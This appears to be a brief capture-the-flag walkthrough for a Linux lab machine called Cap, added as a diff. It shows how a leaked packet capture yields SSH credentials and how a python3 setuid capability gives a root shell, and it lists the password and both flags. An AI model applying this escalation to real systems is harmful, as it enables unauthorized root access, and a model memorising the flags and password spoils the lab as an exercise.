@@ -1,0 +1,26 @@
+OS : LINUX
+IP: 10.10.10.245
+POINTS : 20
+
+STEPS TO ENUMERATION FOR MACHINE CAP
+
+http://10.10.10.245/
+Username : nathan
+
+http://10.10.10.245/data/9
+http://10.10.10.245/data/0
+Download all data packets 
+Now open data packt with Wireshark and examine.
+PASSWORD : Buck3tH4TF0RM3!
+CONNECT SSH : ssh nathan@10.10.10.245
+PASSWORD is : Buck3tH4TF0RM3!
+
+LINUX PRIV. ESCALATION CAPABILITIS
+    DETECTIONS
+    getcap -r / 2>/dev/null
+    
+    python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+    
+Got root access
+root flag : f6c6cbfed4797046c9f7c9f87f798610
+User flag : 4eabb8bbf05d28beded81bb4df20ae0c
